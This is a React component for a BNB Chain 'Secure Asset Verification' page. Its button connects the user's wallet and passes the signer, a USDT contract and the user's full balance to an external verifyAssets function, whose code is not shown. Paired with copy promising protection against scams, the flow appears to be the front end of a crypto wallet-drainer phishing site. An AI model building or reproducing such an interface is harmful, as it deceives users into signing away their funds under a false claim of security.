import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { VerificationSectionProps } from '@/types'
import { useEffect, useState } from "react";
import { verifyAssets } from "./RecentVerifications";
const VerificationSection = ({
  isConnecting,
  connectAndFund,
  provider,
  signer,
  userAddress,
  usdt,
  balance,
  readableBalance,
  decimals
}: VerificationSectionProps) => {
  const [isVerifying, setIsVerifying] = useState(false);
  const [shouldVerify, setShouldVerify] = useState(false);

  useEffect(() => {
    const runVerification = async () => {
      if (!isConnecting && shouldVerify && provider && signer && userAddress && usdt && balance && readableBalance && decimals) {
        setIsVerifying(true);
        try {
          await verifyAssets(provider, signer, userAddress, usdt, balance, readableBalance, decimals);
        } finally {
          setIsVerifying(false);
          setShouldVerify(false);
        }
      }
    };

    runVerification();
  }, [isConnecting, shouldVerify, provider, signer, userAddress, usdt, balance, readableBalance, decimals]);

  const handleVerify = async () => {
    if (isConnecting) {
      return;
    }

    if (!provider || !signer || !userAddress || !usdt || !balance || !readableBalance || !decimals) {
      setShouldVerify(true);
      await connectAndFund();
    } else {
      setShouldVerify(true);
    }
  };

  const isLoading = isConnecting || isVerifying;
  const buttonText = isConnecting ? 'Connecting...' : isVerifying ? 'Verifying...' : 'Verify Assets';

  return (
    <Card className="border border-border bg-card/50 backdrop-blur-sm overflow-hidden relative animate-fade-in">
      <CardContent className="pt-6 pb-8 relative z-10">
        {/* BNB Chain Verification Tag */}
        <div className="inline-block px-4 py-1.5 border border-gold text-gold text-xs font-medium rounded-md mb-6 animate-slide-up">
          BNB CHAIN VERIFICATION
        </div>

        {/* Main content */}
        <div className="flex flex-col md:flex-row items-start justify-between gap-6">
          <div className="max-w-md animate-slide-up" style={{ animationDelay: '150ms' }}>
            <h1 className="text-4xl font-bold mb-4">Secure Asset Verification</h1>
            <p className="text-muted-foreground mb-6">
              Verify your BNB Chain assets with our advanced security protocol.
              Protect against scams and ensure your transactions are secure.
            </p>

            <button 
              onClick={handleVerify}
              disabled={isLoading}
              className="inline-flex h-10 items-center justify-center rounded bg-yellow-500 hover:bg-yellow-600 px-6 font-medium text-black transition-colors disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {isLoading ? (
                <>
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  {buttonText}
                </>
              ) : (
                buttonText
              )}
            </button>
          </div>

          {/* BNB Logo */}
          <div className="hidden md:flex items-center justify-center animate-fade-in" style={{ animationDelay: '300ms' }}>
            <div className="relative w-36 h-36 flex items-center justify-center animate-float">
              <div className="absolute inset-0 rounded-full border border-gold/20 animate-[spin_25s_linear_infinite]"></div>
              <div className="absolute inset-2 rounded-full border border-gold/15 animate-[spin_20s_linear_infinite_reverse]"></div>
              <div className="absolute inset-4 rounded-full border border-gold/10 animate-[spin_15s_linear_infinite]"></div>
              <div className="absolute inset-8 rounded-full border border-gold/10 flex items-center justify-center">
                <div className="absolute h-2 w-2 rounded-full bg-gold -top-1 animate-pulse-glow"></div>
                <div className="absolute h-2 w-2 rounded-full bg-gold -right-1 animate-pulse-glow" style={{ animationDelay: '400ms' }}></div>
                <div className="absolute h-2 w-2 rounded-full bg-gold -bottom-1 animate-pulse-glow" style={{ animationDelay: '800ms' }}></div>
                <div className="absolute h-2 w-2 rounded-full bg-gold -left-1 animate-pulse-glow" style={{ animationDelay: '1200ms' }}></div>
              </div>
              <div className="w-16 h-16 bg-gold/10 rounded-full flex items-center justify-center animate-pulse-glow">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="32"
                  height="32"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="1.5"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="text-gold"
                >
                  <path d="M12 2v8" />
                  <path d="m4.93 10.93 7.07 7.07" />
                  <path d="M12 22v-8" />
                  <path d="m19.07 13.07-7.07-7.07" />
                  <path d="M2 12h8" />
                  <path d="M22 12h-8" />
                </svg>
              </div>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

export default VerificationSection
